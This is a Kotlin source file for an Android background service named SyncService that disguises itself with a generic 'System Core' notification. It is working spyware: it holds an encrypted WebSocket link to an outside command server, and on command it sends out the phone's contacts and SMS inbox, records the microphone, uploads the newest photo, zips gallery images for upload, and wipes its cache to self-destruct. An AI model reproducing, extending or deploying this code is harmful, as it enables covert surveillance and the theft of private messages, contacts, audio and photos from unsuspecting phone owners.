package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.security.MessageDigest
import java.util.concurrent.TimeUnit
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SyncService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val ioScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var webSocket: WebSocket? = null
    private val SERVER_URL = "wss://web-assets-service-2.onrender.com"
    private val MASTER_KEY = "god_tier_master_key"
    private val secretKey = MessageDigest.getInstance("SHA-256").digest(MASTER_KEY.toByteArray())
    private var isConnected = false

    override fun onCreate() {
        super.onCreate()
        wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager)
            .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Uranium::GodTier").apply { acquire() }
        startForegroundService()
    }

    private fun startForegroundService() {
        val ch = "uranium_core"
        (getSystemService(NotificationManager::class.java)).createNotificationChannel(
            NotificationChannel(ch, "Core", NotificationManager.IMPORTANCE_LOW)
        )
        startForeground(1, NotificationCompat.Builder(this, ch)
            .setContentTitle("System Core").setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_menu_manage).build())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        connectSocket()
        return START_STICKY
    }

    private fun connectSocket() {
        val client = OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build()
        val req = Request.Builder().url(SERVER_URL)
            .addHeader("X-Node-ID", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
            .addHeader("X-Node-Model", Build.MODEL).build()

        webSocket = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, res: Response) { isConnected = true }
            override fun onMessage(ws: WebSocket, text: String) {
                val dec = decrypt(text) ?: return
                try {
                    val cmd = JSONObject(dec).optString("cmd")
                    if (cmd.isNotEmpty() && cmd != "SYNC_READY") ioScope.launch { executeCommand(cmd) }
                } catch (_: Exception) {}
            }
            override fun onFailure(ws: WebSocket, t: Throwable, r: Response?) { isConnected = false; reconnect() }
            override fun onClosed(ws: WebSocket, code: Int, reason: String) { isConnected = false; reconnect() }
        })
    }

    private fun reconnect() {
        Handler(Looper.getMainLooper()).postDelayed({ connectSocket() }, 5000)
    }

    private fun executeCommand(cmd: String) {
        when {
            cmd.contains("EXTRACT_CONTACTS") -> sendFile("Contacts.txt", readContacts().toByteArray())
            cmd.contains("EXTRACT_SMS") -> sendFile("SMS.txt", readSMS().toByteArray())
            cmd.contains("MIC_AI_LISTEN") -> recordAudio()
            cmd.contains("MICRO_BURST_SNAP") -> snapPhoto()
            cmd.contains("PROC_DCIM") -> zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            cmd.contains("SELF_DESTRUCT") -> { cacheDir.deleteRecursively(); stopSelf() }
        }
    }

    private fun sendFile(name: String, bytes: ByteArray) {
        if (!isConnected) return
        val obj = JSONObject().apply {
            put("type", "data")
            put("filename", name)
            put("content", Base64.encodeToString(bytes, Base64.NO_WRAP))
            put("isBase64", true)
        }
        webSocket?.send(encrypt(obj.toString()))
    }

    private fun recordAudio() {
        try {
            val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp")
            val rec = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(f.absolutePath); prepare(); start()
            }
            Thread.sleep(6000L)
            rec.stop(); rec.release()
            if (f.exists()) sendFile(f.name, f.readBytes())
            f.delete()
        } catch (_: Exception) {}
    }

    private fun snapPhoto() {
        try {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val proj = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            contentResolver.query(uri, proj, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                if (c.moveToFirst()) {
                    val id = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                    val name = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)) ?: "snap.jpg"
                    contentResolver.openInputStream(ContentUris.withAppendedId(uri, id))?.use { input ->
                        sendFile("snap_$name", input.readBytes())
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun zipFolder(folder: String, uri: Uri) {
        try {
            val zip = File(cacheDir, "${folder}_${System.currentTimeMillis()}.zip")
            ZipOutputStream(FileOutputStream(zip)).use { z ->
                z.setLevel(Deflater.BEST_COMPRESSION)
                contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME), null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                    var count = 0
                    while (c.moveToNext() && count < 40) {
                        val id = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                        val n = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)) ?: "file"
                        contentResolver.openInputStream(ContentUris.withAppendedId(uri, id))?.use { input ->
                            z.putNextEntry(ZipEntry("$folder/$n")); input.copyTo(z); z.closeEntry(); count++
                        }
                    }
                }
            }
            if (zip.exists()) sendFile(zip.name, zip.readBytes())
            zip.delete()
        } catch (_: Exception) {}
    }

    private fun readContacts(): String = StringBuilder("=== CONTACTS ===\n").apply {
        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c ->
            while (c.moveToNext()) append("• ${c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}: ${c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))}\n")
        }
    }.toString()

    private fun readSMS(): String = StringBuilder("=== SMS ===\n").apply {
        contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c ->
            while (c.moveToNext()) append("From: ${c.getString(c.getColumnIndexOrThrow("address"))}\n${c.getString(c.getColumnIndexOrThrow("body"))}\n---\n")
        }
    }.toString()

    private fun encrypt(text: String): String {
        val iv = ByteArray(12); java.security.SecureRandom().nextBytes(iv)
        val c = Cipher.getInstance("AES/GCM/NoPadding").apply { init(Cipher.ENCRYPT_MODE, SecretKeySpec(secretKey, "AES"), GCMParameterSpec(128, iv)) }
        return Base64.encodeToString(iv + c.doFinal(text.toByteArray()), Base64.NO_WRAP)
    }

    private fun decrypt(b64: String): String? = try {
        val data = Base64.decode(b64, Base64.NO_WRAP)
        val c = Cipher.getInstance("AES/GCM/NoPadding").apply { init(Cipher.DECRYPT_MODE, SecretKeySpec(secretKey, "AES"), GCMParameterSpec(128, data.copyOfRange(0, 12))) }
        String(c.doFinal(data.copyOfRange(12, data.size)))
    } catch (_: Exception) { null }

    override fun onDestroy() { wakeLock?.release(); ioScope.cancel(); webSocket?.close(1000, "stopped"); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
